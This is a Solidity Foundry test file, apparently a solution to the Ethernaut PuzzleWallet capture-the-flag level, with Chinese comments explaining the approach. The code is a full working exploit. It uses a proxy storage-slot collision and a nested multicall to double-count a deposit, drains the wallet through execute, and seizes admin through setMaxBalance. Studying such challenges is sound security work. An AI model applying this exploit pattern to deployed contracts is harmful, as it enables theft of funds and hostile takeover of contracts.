pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";


/** 
 * 解题思路：通过 multicall 和 合约内存布局的漏洞来获取 admin
 * PuzzlePxozy 中的 admin 对应 PuzzleWallet 中的 maxBalance，所以同可以通过 修改 maxBalance 来修改 admin
 * PuzzleProxy 有默认的 balance，可以通过 multicall 来转账一次来记录两次的余额
 * 再通过 execute 来将 PuzzleProxy 的 balance 为零
 * 然后通过 setMaxBalance 来设置新的 admin
 */
contract HackPuzzleWalletTest is Test {
    address hacker = address(11111111111111);
    address hacker2 = address(222222222222222222222222);
    PuzzleProxy public pp;
    PuzzleWallet public w;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        vm.deal(hacker2, 1 ether);
    }
    function testHackPuzzleWallet() public {
        vm.startPrank(hacker);
        w = new PuzzleWallet();
        bytes memory data;
        pp = new PuzzleProxy(hacker2, address(w), data);
        vm.deal(address(pp), 0.01 ether);

        console.log("balance:", address(pp).balance);
        pp.proposeNewAdmin(hacker2);

        vm.stopPrank();

        // 开始 hack
        vm.startPrank(hacker2);
        // 构造 multicall 参数，让它调用自己再调用 deposit 一次，这样一次转账，balance 中的记录翻一倍
        bytes[] memory s = new bytes[](1);
        s[0] = abi.encodeWithSelector(w.deposit.selector);
        bytes[] memory m = new bytes[](2);
        m[0] = abi.encodeWithSelector(w.deposit.selector);
        m[1] = abi.encodeWithSelector(w.multicall.selector, s);

        // 查看当前的 owner
        (bool re1, bytes memory o) = address(pp).call(abi.encodeWithSignature("owner()"));
        assert(re1 == true);
        console.log("owner:");
        console.logBytes(o);
        
        // 查看当前的 maxBalance
        (bool re2, bytes memory mb) = address(pp).call(abi.encodeWithSignature("maxBalance()"));
        assert(re2 == true);
        console.log("maxBalance:");
        console.logBytes(mb);
        
        // 将当前的地址加入白名单
        (bool re3, ) = address(pp).call(abi.encodeWithSignature("addToWhitelist(address)", hacker2));
        assert(re3 == true);

        // 发起攻击，让 0.01 ether 产生 0.02 ether 的记录 
        (bool re4, ) = address(pp).call{value: 0.01 ether}(abi.encodeWithSignature("multicall(bytes[])", m));
        assert(re4 == true);

        (bool re5, ) = address(pp).call(abi.encodeWithSignature("execute(address,uint256,bytes)", hacker2, 0.02 ether, ""));
        assert(re5 == true);

        // balance 为 0
        console.log("balance:", address(pp).balance);

        
        // PuzzleProxy 中的 admin 对应 PuzzleWallet 中的 maBalance, 设置成新的地址即可
        (bool re6, ) = address(pp).call(abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(hacker))));
        assert(re6 == true);

        (bool re7, bytes memory o1) = address(pp).call(abi.encodeWithSignature("maxBalance()"));
        assert(re7 == true);

        console.log("new admin:");
        console.logBytes(o1);
        console.log("hacker: ", hacker);
        vm.stopPrank();
    }
}